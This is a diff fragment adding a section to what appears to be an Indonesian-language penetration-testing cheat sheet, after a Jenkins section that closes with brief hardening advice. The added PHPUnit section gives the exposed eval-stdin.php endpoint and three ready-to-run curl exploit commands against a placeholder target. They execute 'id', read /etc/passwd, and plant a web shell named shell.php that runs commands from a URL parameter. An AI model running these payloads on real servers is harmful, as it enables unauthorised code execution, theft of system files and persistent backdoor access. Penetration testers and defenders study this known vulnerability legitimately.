@@ -894,4 +894,12 @@ Selalu update Jenkins & plugin, batasi akses Script Console dan API.
 
 Monitor log dan audit job pipeline.
 
+=====================================================================================================================================================================================================================================================================
+PHPUNIT 
 
+ENDPOINT : /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+CONTOH https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('id'); ?>"
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('cat /etc/passwd'); ?>"
+curl -X POST https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data "<?php file_put_contents('shell.php','<?php system(\$_GET[\"cmd\"]); ?>'); ?>"
